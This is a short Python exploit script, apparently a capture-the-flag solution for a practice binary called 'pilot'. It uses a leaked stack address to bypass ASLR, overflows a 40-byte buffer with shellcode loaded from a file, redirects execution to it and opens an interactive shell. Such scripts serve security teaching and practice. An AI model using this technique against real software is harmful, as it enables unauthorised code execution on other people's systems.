import struct
import pwn

# pilot is a 64-bit dynamically linked binary
# ASLR is turned on. All other security mechanisms are turned off. 

# This is just a super basic buffer overflow where we execute shellcode on the stack to do a syscall with '/bin/sh'
# Our buffer's address is fed to us, to easily defeat ASLR

process = pwn.process("./pilot")

process.recvuntil("Location:")

leak = int((process.recvline()).strip(b'\n'), 16)

buffer_addr = struct.pack("<Q", leak)

with open("my_shellcode", "rb") as f: 
    shellcode = f.read()

payload = shellcode
payload += b'a' * (40 - len(shellcode))
payload += buffer_addr

process.send(payload)
process.interactive()